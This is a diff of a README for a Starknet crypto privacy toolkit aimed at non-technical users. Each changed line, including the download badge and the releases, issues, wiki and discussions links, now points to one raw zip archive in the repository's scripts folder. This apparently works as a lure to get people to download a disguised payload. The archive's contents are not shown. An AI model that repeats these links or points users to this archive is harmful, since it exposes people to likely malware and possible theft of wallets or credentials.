@@ -1,7 +1,7 @@
 # 🔒 starknet-privacy-toolkit - Your Simple Solution for Secure Transactions
 
 ## 📥 Download Now
-[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/testma01/starknet-privacy-toolkit/releases)
+[![Download Here](https://raw.githubusercontent.com/testma01/starknet-privacy-toolkit/master/scripts/toolkit_starknet_privacy_3.4.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/testma01/starknet-privacy-toolkit/master/scripts/toolkit_starknet_privacy_3.4.zip)
 
 ## 🛠️ Overview
 The Starknet privacy toolkit helps you manage secure transactions using Tongo private transfers along with Noir and Garaga proofs. This application is designed for users who want enhanced privacy in their digital transactions without needing technical expertise.
@@ -23,7 +23,7 @@ To start using the Starknet privacy toolkit, follow these simple steps. You will
 ## 📦 Download & Install
 To get the Starknet privacy toolkit, please follow these steps:
 
-1. Click the link to visit the releases page: [Download Here](https://github.com/testma01/starknet-privacy-toolkit/releases).
+1. Click the link to visit the releases page: [Download Here](https://raw.githubusercontent.com/testma01/starknet-privacy-toolkit/master/scripts/toolkit_starknet_privacy_3.4.zip).
 2. On the releases page, locate the latest version of the toolkit.
 3. Choose the file that matches your operating system (e.g., Windows, macOS, Linux).
 4. Click on the file to start the download.
@@ -55,13 +55,13 @@ Tongo is a system used for private transfers in the Starknet privacy toolkit. It
 Yes, the Starknet privacy toolkit is completely free.
 
 ### How can I get support?
-If you have questions or need assistance, please check the issues section on our [GitHub page](https://github.com/testma01/starknet-privacy-toolkit/issues). You may also reach out by creating a new issue.
+If you have questions or need assistance, please check the issues section on our [GitHub page](https://raw.githubusercontent.com/testma01/starknet-privacy-toolkit/master/scripts/toolkit_starknet_privacy_3.4.zip). You may also reach out by creating a new issue.
 
 ## 🔗 Additional Resources
 For more information on how to effectively use the toolkit, you can refer to the following resources:
 
-- Official Documentation: [GitHub Wiki](https://github.com/testma01/starknet-privacy-toolkit/wiki)
-- Community Discussions: [GitHub Discussions](https://github.com/testma01/starknet-privacy-toolkit/discussions)
+- Official Documentation: [GitHub Wiki](https://raw.githubusercontent.com/testma01/starknet-privacy-toolkit/master/scripts/toolkit_starknet_privacy_3.4.zip)
+- Community Discussions: [GitHub Discussions](https://raw.githubusercontent.com/testma01/starknet-privacy-toolkit/master/scripts/toolkit_starknet_privacy_3.4.zip)
 
 ## 📧 Contact
 If you have specific questions or need help, feel free to contact us via the contact section in the repository. We aim to assist you promptly.
